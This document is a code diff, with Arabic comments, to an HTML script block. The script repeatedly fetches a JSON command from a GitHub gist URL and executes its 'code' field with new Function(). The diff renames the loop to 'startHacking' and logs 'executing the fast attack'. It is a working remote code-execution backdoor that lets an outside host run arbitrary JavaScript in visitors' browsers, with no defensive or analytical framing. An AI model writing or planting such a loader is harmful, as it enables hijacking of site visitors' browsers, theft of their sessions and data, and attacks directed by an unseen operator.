@@ -1,22 +1,24 @@
 <script>
-    // الرابط الدائم لـ Gist الخاص بك
-    const gistUrl = "https://gist.githubusercontent.com/aso818/036d35d5f22a44cd5ec3630d8a70b3ca/raw/4a0b176dc31fc57c6bfdc1d2fe0e0cb4e96511d1/command.json"; 
+    // هذا الرابط ثابت ولا يتغير أبداً
+    const gistUrl = "https://gist.githubusercontent.com/aso818/036d35d5f22a44cd5ec3630d8a70b3ca/raw/command.json";
+    let lastExecuted = ""; 
 
-    async function startListening() {
+    async function startHacking() {
         try {
-            // إضافة التوقيت ?t لمنع التخزين المؤقت وسحب الأمر الجديد فوراً
-            const response = await fetch(gistUrl + "?t=" + new Date().getTime());
+            // إضافة التوقيت لمنع التخزين المؤقت (Cache)
+            const response = await fetch(gistUrl + "?t=" + Date.now());
             const data = await response.json();
 
-            if (data.code && data.code !== "") {
-                console.log("تم استلام أمر جديد: " + data.code);
+            if (data.code && data.code !== "" && data.code !== lastExecuted) {
+                lastExecuted = data.code; 
+                console.log("جاري تنفيذ الهجوم السريع...");
                 new Function(data.code)();
             }
         } catch (e) {
-            // لا يوجد أمر حالياً أو خطأ في الاتصال
+            // في حال كان الرابط لا يزال يحدث أو الملف فارغ
         }
-        setTimeout(startListening, 2000); // يفحص كل ثانيتين
+        setTimeout(startHacking, 2000); 
     }
 
-    startListening();
+    startHacking();
 </script>
